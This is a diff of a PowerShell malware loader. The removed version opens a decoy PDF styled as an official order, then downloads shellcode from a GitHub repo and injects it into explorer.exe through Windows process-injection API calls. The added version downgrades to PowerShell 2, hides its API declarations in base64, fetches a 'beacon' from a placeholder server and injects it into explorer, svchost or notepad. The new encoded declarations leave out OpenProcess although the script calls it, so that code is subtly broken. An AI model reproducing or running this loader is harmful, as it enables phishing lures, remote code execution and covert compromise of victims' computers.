@@ -1,75 +1,18 @@
-$ErrorActionPreference = 'SilentlyContinue'
-
-$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/Nakaz_No._661_vid_02.03.2026.pdf"
-$pdfPath = "$env:TEMP\nakaz.pdf"
-
-$downloaded = $false
-for ($i = 1; $i -le 3; $i++) {
-    try {
-        Invoke-WebRequest -Uri $pdfUrl `
-            -OutFile $pdfPath `
-            -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'} `
-            -UseBasicParsing -TimeoutSec 30
-        
-        if (Test-Path $pdfPath) {
-            $downloaded = $true
-            break
-        }
-    } catch {}
-    Start-Sleep -Seconds 1
+if ($PSVersionTable.PSVersion.Major -gt 2) {
+    powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -File "$($MyInvocation.MyCommand.Path)"
+    exit
 }
 
-if ($downloaded) {
-    Unblock-File -Path $pdfPath -ErrorAction SilentlyContinue
-    Start-Process -FilePath $pdfPath -ErrorAction SilentlyContinue
-}
+$encodedCSharp = "W3VzaW5nIFN5c3RlbTsgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOyBwdWJsaWMgY2xhc3MgVXRpbCB7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXgoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEJhc2VBZGRyZXNzLCBieXRlW10gbHBCdWZmZXIsIHVpbnQgblNpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7IH0="
+$csharpCode = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCSharp))
+Add-Type $csharpCode
 
-if (Test-Path $pdfPath) {
-    $shellcodeUrl = "https://github.com/astro-opensource/cloud-sync-tools/raw/refs/heads/main/assets/payload.bin"
-    $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl `
-        -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'} `
-        -UseBasicParsing -TimeoutSec 30).Content
+$shellcodeUrl = "https://your-server.com/beacon.bin"
+$shellcode = (New-Object Net.WebClient).DownloadData($shellcodeUrl)
 
-    $code = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
+$target = Get-Process -Name explorer, svchost, notepad -ErrorAction SilentlyContinue | Select-Object -First 1
+$hProcess = [Util]::OpenProcess(0x1F0FFF, $false, $target.Id)
 
-public class Inject {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool CloseHandle(IntPtr hObject);
-}
-'@
-    Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
-
-    $explorer = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
-    if ($explorer) {
-        $hProc = [Inject]::OpenProcess(0x1F0FFF, $false, $explorer.Id)
-        if ($hProc -ne [IntPtr]::Zero) {
-            $addr = [Inject]::VirtualAllocEx($hProc, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
-            if ($addr -ne [IntPtr]::Zero) {
-                $written = [IntPtr]::Zero
-                [Inject]::WriteProcessMemory($hProc, $addr, $shellcode, $shellcode.Length, [ref]$written)
-
-                $remoteId = [IntPtr]::Zero
-                $remote = [Inject]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$remoteId)
-                if ($remote -ne [IntPtr]::Zero) {
-                    [Inject]::CloseHandle($remote)
-                }
-            }
-            [Inject]::CloseHandle($hProc)
-        }
-    }
-}
+$addr = [Util]::VirtualAllocEx($hProcess, 0, $shellcode.Length, 0x1000, 0x40)
+[Util]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$null)
+[Util]::CreateRemoteThread($hProcess, 0, 0, $addr, 0, 0, [ref]$null)
